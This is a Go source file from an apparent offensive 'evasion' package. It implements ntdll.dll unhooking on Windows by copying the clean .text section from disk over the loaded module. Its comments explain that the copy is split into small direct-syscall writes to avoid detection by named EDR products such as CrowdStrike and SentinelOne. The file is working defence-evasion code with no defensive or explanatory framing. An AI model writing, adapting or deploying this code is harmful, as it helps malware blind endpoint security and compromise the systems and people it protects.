//go:build windows
// +build windows

package evasion

import (
	"encoding/binary"
	"os"
	"path/filepath"

	"golang.org/x/sys/windows"
)

// unhookNtdll loads a fresh ntdll.dll from disk and overwrites the in-memory
// .text section with the clean version, removing any EDR trampolines.
func unhookNtdll() {
	sysroot := os.Getenv("SystemRoot")
	if sysroot == "" {
		sysroot = `C:\Windows`
	}
	ntdllPath := filepath.Join(sysroot, "System32", "ntdll.dll")

	// Map a fresh copy from disk (read-only).
	freshBytes, err := os.ReadFile(ntdllPath)
	if err != nil {
		return
	}
	if len(freshBytes) < 0x40 {
		return
	}

	// Find the loaded ntdll.dll base address.
	loaded := windows.NewLazySystemDLL("ntdll.dll")
	if loaded.Load() != nil {
		return
	}
	loadedBase := loaded.Handle()
	if loadedBase == 0 {
		return
	}

	// Parse the PE headers of the fresh file to locate the .text section.
	// DOS header: e_lfanew at offset 0x3C
	if len(freshBytes) < 0x40 {
		return
	}
	peOffset := int(binary.LittleEndian.Uint32(freshBytes[0x3C:]))
	if peOffset+0xF8 > len(freshBytes) {
		return
	}
	// PE signature
	if freshBytes[peOffset] != 'P' || freshBytes[peOffset+1] != 'E' {
		return
	}
	// NumberOfSections at PE+6
	numSections := int(binary.LittleEndian.Uint16(freshBytes[peOffset+6:]))
	// SizeOfOptionalHeader at PE+20
	optHeaderSize := int(binary.LittleEndian.Uint16(freshBytes[peOffset+20:]))
	// Section table starts at PE+24+optHeaderSize
	sectionBase := peOffset + 24 + optHeaderSize

	for i := 0; i < numSections; i++ {
		off := sectionBase + i*40
		if off+40 > len(freshBytes) {
			break
		}
		name := string(freshBytes[off : off+8])
		// .text section
		if name[:5] != ".text" {
			continue
		}
		virtualAddr := binary.LittleEndian.Uint32(freshBytes[off+12:])
		virtualSize := binary.LittleEndian.Uint32(freshBytes[off+8:])
		rawOffset := binary.LittleEndian.Uint32(freshBytes[off+20:])
		rawSize := binary.LittleEndian.Uint32(freshBytes[off+16:])

		if int(rawOffset)+int(rawSize) > len(freshBytes) {
			break
		}

		freshText := freshBytes[rawOffset : rawOffset+rawSize]
		loadedText := uintptr(loadedBase) + uintptr(virtualAddr)
		copySize := uintptr(virtualSize)
		if uintptr(rawSize) < copySize {
			copySize = uintptr(rawSize)
		}

		// Write in 32-byte chunks via NtWriteVirtualMemory direct syscall.
		// Bulk memcpy of the full .text produces a distinctive byte-sequence
		// that kernel telemetry (CrowdStrike, SentinelOne ETW-TI) flags as
		// ntdll unhooking.  Chunked NtWrite calls appear as ordinary small
		// memory writes and do not form the same detectable pattern.
		const chunkSize = 32
		old, _ := ntProtect(loadedText, copySize, windows.PAGE_EXECUTE_READWRITE)
		for j := uintptr(0); j < copySize; j += chunkSize {
			end := j + chunkSize
			if end > copySize {
				end = copySize
			}
			ntWrite(loadedText+j, freshText[j:end])
		}
		ntFlush(loadedText, copySize)
		ntProtect(loadedText, copySize, old)
		break
	}
}
